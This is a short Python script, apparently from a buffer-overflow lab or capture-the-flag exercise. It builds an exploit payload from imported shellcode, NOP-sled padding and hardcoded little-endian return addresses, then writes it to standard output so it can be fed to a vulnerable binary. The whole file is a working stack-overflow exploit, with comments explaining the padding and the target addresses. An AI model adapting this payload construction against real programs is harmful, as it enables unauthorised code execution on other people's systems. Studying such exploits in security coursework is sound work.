from shellcode import shellcode
import sys
if __name__ == "__main__":
    sys.stdout.buffer.write(shellcode +  #53 long
    b"\x90\x90\x90" + #pad to 56 using nop, multiple of 4
    b"\x90" * 48 + #48
    b"\x04\x80\x0f\x08" + # we want 0x080e8000
    b"\x98\xd8\xf6\xff" +  # we want 0xfff6d898
    #sys.stdout.buffer.write(b"\xad\xa0\x04\x08") # we want 0x0804a0ad
    b"\x0c\xd8\xf6\xff") #we want 0xfff6d80c
